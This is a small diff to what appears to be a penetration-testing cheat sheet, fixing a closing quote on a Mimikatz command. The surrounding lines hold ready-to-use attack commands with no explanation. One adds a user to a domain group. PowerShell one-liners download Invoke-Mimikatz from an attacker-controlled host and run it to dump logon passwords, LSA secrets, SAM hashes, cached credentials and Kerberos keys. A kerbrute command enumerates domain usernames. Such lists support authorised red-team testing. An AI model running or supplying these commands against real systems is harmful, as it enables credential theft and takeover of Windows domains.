@@ -678,7 +678,7 @@ net group "{GROUP}" {USERNAME} /add
 
 # MimiKatz Cred Dump
 IEX (New-Object System.Net.Webclient).DownloadString("http://{IP ADDRESS}/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -DumpCreds 
-IEX (New-Object System.Net.Webclient).DownloadString("http://{IP ADDRESS}/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
+IEX (New-Object System.Net.Webclient).DownloadString("http://{IP ADDRESS}/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 
 # Kerbrute Brute Force
 sudo /opt/kerbrute/kerbrute userenum -d {DOMAIN} --dc {IP ADDRESS} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  
